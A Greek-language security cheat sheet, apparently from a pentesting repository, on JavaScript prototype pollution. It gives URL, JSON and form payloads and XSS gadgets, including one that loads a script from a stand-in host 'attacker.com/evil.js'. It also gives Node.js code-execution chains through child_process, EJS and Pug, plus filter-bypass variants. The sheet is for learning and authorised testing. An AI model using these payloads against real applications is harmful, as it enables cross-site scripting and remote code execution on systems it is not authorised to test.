# 🧬 Prototype Pollution — Αλλοίωση πρωτοτύπων JavaScript

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

<p align="center">
<a href="../README.md">🇬🇧 English</a> • <a href="README.tr.md">🇹🇷 Türkçe Sürüm</a>
</p>

```
  ██████╗ ██████╗  ██████╗ ████████╗ ██████╗ ████████╗██╗   ██╗██████╗ ███████╗
  ██╔══██╗██╔══██╗██╔═══██╗╚══██╔══╝██╔═══██╗╚══██╔══╝╚██╗ ██╔╝██╔══██╗██╔════╝
  ██████╔╝██████╔╝██║   ██║   ██║   ██║   ██║   ██║    ╚████╔╝ ██████╔╝█████╗  
  ██╔═══╝ ██╔══██╗██║   ██║   ██║   ██║   ██║   ██║     ╚██╔╝  ██╔═══╝ ██╔══╝  
  ██║     ██║  ██║╚██████╔╝   ██║   ╚██████╔╝   ██║      ██║   ██║     ███████╗
  ╚═╝     ╚═╝  ╚═╝ ╚═════╝    ╚═╝    ╚═════╝    ╚═╝      ╚═╝   ╚═╝     ╚══════╝
                 ██████╗  ██████╗ ██╗     ██╗     ██╗   ██╗████████╗██╗ ██████╗ ███╗   ██╗
                 ██╔══██╗██╔═══██╗██║     ██║     ██║   ██║╚══██╔══╝██║██╔═══██╗████╗  ██║
                 ██████╔╝██║   ██║██║     ██║     ██║   ██║   ██║   ██║██║   ██║██╔██╗ ██║
                 ██╔═══╝ ██║   ██║██║     ██║     ██║   ██║   ██║   ██║██║   ██║██║╚██╗██║
                 ██║     ╚██████╔╝███████╗███████╗╚██████╔╝   ██║   ██║╚██████╔╝██║ ╚████║
                 ╚═╝      ╚═════╝ ╚══════╝╚══════╝ ╚═════╝    ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝
```

---

## Πριν ξεκινήσετε

Στη JavaScript, πολλά αντικείμενα κληρονομούν ιδιότητες από ένα **prototype** (πρωτότυπο). Το **prototype pollution** εμφανίζεται όταν μη έμπιστη είσοδος αλλάζει ιδιότητες πρωτοτύπου και επηρεάζει τη συμπεριφορά άλλου κώδικα.

**Βασικοί όροι:** *source* = προέλευση ελεγχόμενης εισόδου, *gadget* = αξιοποιήσιμο σημείο κώδικα που χρησιμοποιεί την επηρεασμένη ιδιότητα, *sink* = λειτουργία με επίπτωση στην ασφάλεια, *merge* = συγχώνευση αντικειμένων, *client-side/server-side* = στην πλευρά browser/server.

Μια ιδιότητα σε JSON ή URL δεν αλλάζει αυτόματα κάποιο πρωτότυπο. Χρειάζεται συγκεκριμένος μη ασφαλής χειρισμός εισόδου και, για πραγματικό αντίκτυπο όπως XSS ή εκτέλεση κώδικα, κατάλληλη αλυσίδα χρήσης. Τα παραδείγματα του πρωτοτύπου διατηρούνται, με σημειώσεις για τις προϋποθέσεις τους.

## Περιεχόμενα

- [🎯 Τι είναι το prototype pollution](#section-01)
- [🔍 Πρωτότυπα αντικειμένων JavaScript](#section-02)
- [💉 Παραδείγματα στην πλευρά του browser](#section-03)
- [🔥 Παραδείγματα πιθανών συνεπειών](#section-04)
- [🖥️ Στην πλευρά του server με Node.js](#section-05)
- [🔍 Ανίχνευση](#section-06)
- [🛠️ Εργαλεία](#section-07)
- [📊 Γρήγορη αναφορά](#section-08)
- [📚 Πηγές](#section-09)

---

<a id="section-01"></a>

## 🎯 Τι είναι το prototype pollution

Το **Prototype Pollution** είναι ευπάθεια JavaScript κατά την οποία μη έμπιστα δεδομένα επηρεάζουν ιδιότητες ενός πρωτοτύπου, π.χ. του `Object.prototype`. Αντικείμενα που κληρονομούν τις ιδιότητες αυτές μπορεί κατόπιν να εμφανίσουν μη αναμενόμενη συμπεριφορά.

### Επίπτωση
- 🔴 **XSS** — μέσω επηρεασμού του DOM
- 🔴 **RCE** — πιθανή εκτέλεση κώδικα στην πλευρά του server με Node.js
- 🔴 **Παράκαμψη** — πιθανή επίδραση σε ελέγχους ασφάλειας
- 🔴 **Άρνηση υπηρεσίας** — πιθανός τερματισμός της εφαρμογής

---

<a id="section-02"></a>

## 🔍 Πρωτότυπα αντικειμένων JavaScript

> **Η κληρονομικότητα έχει όρια:** Δεν κληρονομούν όλα τα αντικείμενα από Object.prototype, π.χ. αντικείμενα με null prototype. Μια δική τους ιδιότητα μπορεί επίσης να υπερισχύει της κληρονομούμενης. Το παράδειγμα εξηγεί τον μηχανισμό, όχι την ύπαρξη ευπάθειας. Δείτε την [ανάλυση της MDN](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution).


### Πώς λειτουργεί
```javascript
// Τα απλά αντικείμενα αυτού του παραδείγματος κληρονομούν από Object.prototype
let obj = {};
obj.__proto__ === Object.prototype  // true

// Παράδειγμα άμεσης αλλαγής του πρωτοτύπου:
Object.prototype.polluted = "hacked";

// Ένα νέο αντικείμενο μπορεί να κληρονομήσει την ιδιότητα:
let newObj = {};
console.log(newObj.polluted);  // "hacked"
```

### Ιδιότητες που χρειάζονται προσοχή
```javascript
__proto__
constructor
prototype
```

---

<a id="section-03"></a>

## 💉 Παραδείγματα στην πλευρά του browser

### Μέσω παραμέτρων ή τμήματος hash του URL
```
# Βασικό παράδειγμα
?__proto__[polluted]=value
?__proto__.polluted=value

# Μέσω constructor
?constructor[prototype][polluted]=value

# Εμφωλευμένη είσοδος
?__proto__[__proto__][polluted]=value

# Κωδικοποιημένο URL
?__proto__%5Bpolluted%5D=value
```

### Μέσω JSON
```javascript
// Είσοδος χρήστη
{"__proto__": {"polluted": "value"}}
{"constructor": {"prototype": {"polluted": "value"}}}

// Εμφωλευμένη είσοδος
{"a": {"__proto__": {"polluted": "value"}}}
```

### Μέσω δεδομένων φόρμας
```html
<input name="__proto__[polluted]" value="hacked">
<input name="constructor[prototype][polluted]" value="hacked">
```

---

<a id="section-04"></a>

## 🔥 Παραδείγματα πιθανών συνεπειών

> **Απαραίτητη αλυσίδα:** Χρειάζεται μη ασφαλής χειρισμός της εισόδου και πραγματικό gadget/sink. Ένα JSON με __proto__ δεν αλλάζει μόνο του το κοινό πρωτότυπο. Τα παραδείγματα XSS, jQuery, EJS, Pug και Node.js εξαρτώνται από συγκεκριμένο κώδικα, εκδόσεις και περιβάλλον. Δείτε τα [στοιχεία μιας ευπάθειας prototype pollution](https://portswigger.net/web-security/prototype-pollution).


### DOM XSS μέσω innerHTML
```javascript
// Αν υπάρχει η ακόλουθη χρήση στον κώδικα:
element.innerHTML = obj.html || "";

// Ενδεικτική είσοδος αλλαγής πρωτοτύπου:
?__proto__[html]=<img src=x onerror=alert(1)>

// Πιθανό XSS εφόσον επιβεβαιωθεί η απαιτούμενη αλυσίδα
```

### Αξιοποιήσιμο σημείο στην ιδιότητα src ενός script
```javascript
// Αν υπάρχει η ακόλουθη χρήση στον κώδικα:
let script = document.createElement('script');
script.src = obj.src || '/default.js';

// Ενδεικτική είσοδος αλλαγής πρωτοτύπου:
?__proto__[src]=data:,alert(1)//
?__proto__[src]=//attacker.com/evil.js
```

### Σχετικά σημεία χειρισμού του DOM
```javascript
// Ενδεικτικά μοτίβα αξιοποιήσιμων σημείων κώδικα
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?__proto__[outerHTML]=<img src=x onerror=alert(1)>
?__proto__[srcdoc]=<script>alert(1)</script>
```

### Αξιοποιήσιμα σημεία jQuery
```javascript
// jQuery < 3.4.0
$.extend(true, {}, JSON.parse('{"__proto__": {"devMode": true}}'))

// Ενδεικτική είσοδος ελέγχου
?__proto__[url]=javascript:alert(1)
```

---

<a id="section-05"></a>

## 🖥️ Στην πλευρά του server με Node.js

### Πιθανή εκτέλεση κώδικα μέσω child_process
```javascript
// Αν η εφαρμογή καλεί spawn/exec με κατάλληλο αντικείμενο επιλογών:
const { spawn } = require('child_process');
spawn('ls', [], options);

// Ενδεικτική είσοδος αλλαγής πρωτοτύπου:
{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(1)"}}

// Εναλλακτικό παράδειγμα:
{"__proto__": {"shell": true, "env": {"NODE_OPTIONS": "--require /tmp/pwn.js"}}}
```

### Πιθανή εκτέλεση κώδικα μέσω require()
```javascript
// Ενδεικτική είσοδος αλλαγής πρωτοτύπου
{"__proto__": {"main": "./pwned.js"}}
```

### Πιθανή εκτέλεση κώδικα σε EJS
```javascript
// Παράδειγμα του πρωτοτύπου για παλιότερες εκδόσεις EJS· ελέγξτε όλες τις προϋποθέσεις
{"__proto__": {
    "outputFunctionName": "x;process.mainModule.require('child_process').execSync('id');x"
}}
```

### Πιθανή εκτέλεση κώδικα σε Pug
```javascript
// Ενδεικτική αλυσίδα για Pug
{"__proto__": {
    "block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync('id')"
    }
}}
```

---

<a id="section-06"></a>

## 🔍 Ανίχνευση

### Χειροκίνητοι έλεγχοι

> **Η άμεση ανάθεση δεν είναι ανίχνευση ευπάθειας:** Η κονσόλα γράφει μόνη της στο Object.prototype, οπότε η κληρονομούμενη τιμή είναι αναμενόμενη συμπεριφορά JavaScript. Για εύρημα πρέπει να αποδεικνύεται ότι μη έμπιστη είσοδος της εφαρμογής προκαλεί την αλλαγή. Ο καθαρισμός παρακάτω αναιρεί μόνο την ιδιότητα του δείγματος.

```javascript
// Στην κονσόλα του browser:
Object.prototype.testPollution = "polluted";
let obj = {};
console.log(obj.testPollution);  // Η τιμή "polluted" εδώ δείχνει την άμεση αλλαγή που κάναμε, όχι ευπάθεια της εφαρμογής

// Καθαρισμός της αλλαγής
delete Object.prototype.testPollution;
```

### Έλεγχος μέσω URL
```
# Προσθήκη στο URL και έλεγχος στην κονσόλα
?__proto__[test]=polluted

// Στην κονσόλα:
({}).test  // Αναμενόμενη απουσία: undefined· η τιμή "polluted" χρειάζεται συσχέτιση με την είσοδο και την εφαρμογή
```

### Αναζήτηση αξιοποιήσιμων σημείων με DOM Invader
```
1. Ενεργοποιήστε το DOM Invader στον browser του Burp Suite
2. Ενεργοποιήστε τη λειτουργία ελέγχου prototype pollution
3. Περιηγηθείτε στην εφαρμογή
4. Εξετάστε αξιοποιήσιμα σημεία χρήσης των δεδομένων (sinks)
```

---

<a id="section-07"></a>

## 🛠️ Εργαλεία

| Εργαλείο | Σκοπός |
|------|---------|
| **DOM Invader** | Εργαλείο του browser Burp για prototype pollution |
| **ppfuzz** | Εργαλείο δοκιμαστικών εισόδων prototype pollution |
| **ppmap** | Αναζήτηση αξιοποιήσιμων σημείων κώδικα |
| **PPScan** | Εργαλείο ελέγχων στην πλευρά του browser |

### Χρήση ppmap
```bash
# Εγκατάσταση
git clone https://github.com/nickvdyck/ppmap
cd ppmap

# Έλεγχος
node ppmap.js https://target.com
```

---

<a id="section-08"></a>

## 📊 Γρήγορη αναφορά

### Μορφές δοκιμαστικών εισόδων
| Μορφή | Payload |
|--------|---------|
| Παράμετροι URL | `?__proto__[x]=y` |
| Hash | `#__proto__[x]=y` |
| JSON | `{"__proto__":{"x":"y"}}` |
| Συγχώνευση αντικειμένων | `Object.assign({},input)` |

### Συνήθη αξιοποιήσιμα σημεία κώδικα
| Ιδιότητα | Επίπτωση |
|----------|--------|
| `innerHTML` | XSS |
| `src` | Εισαγωγή script |
| `href` | Ανακατεύθυνση |
| `shell` | Πιθανή εκτέλεση κώδικα σε Node.js |
| `env` | Πιθανή εκτέλεση κώδικα σε Node.js |

### Παραδείγματα παράκαμψης του πρωτοτύπου και περιορισμοί

> **Μη ισοδύναμες γραφές:** Η γραμμή με array literal και κλειδί polluted δεν ισοδυναμεί γενικά με πρόσβαση στο Object.prototype. Η συμπεριφορά εξαρτάται από τη συγκεκριμένη έκφραση και το strict mode. Το Object.assign στον πίνακα μορφών επίσης δεν είναι γενική αναδρομική συγχώνευση ούτε αυτόματη απόδειξη παγκόσμιας αλλοίωσης πρωτοτύπων.

```javascript
// Αν φιλτράρεται το __proto__:
constructor.prototype.polluted = "value"

// Διαφορετική γραφή
["__proto__"]["polluted"] = "value"

// Unicode
{"\u005f\u005fproto\u005f\u005f": {"x": "y"}}
```

---

<a id="section-09"></a>

## 📚 Πηγές

- [Οδηγός prototype pollution της PortSwigger](https://portswigger.net/web-security/prototype-pollution)
- [Prototype pollution στην πλευρά του server](https://portswigger.net/research/server-side-prototype-pollution)
- [Εργαλείο ελέγχων prototype pollution στον browser](https://github.com/nickvdyck/ppmap)

---

<p align="center">
  <b>🧬 Εξετάστε την κληρονομικότητα αντικειμένων!</b><br>
  <i>Μόνο για εξουσιοδοτημένους ελέγχους.</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
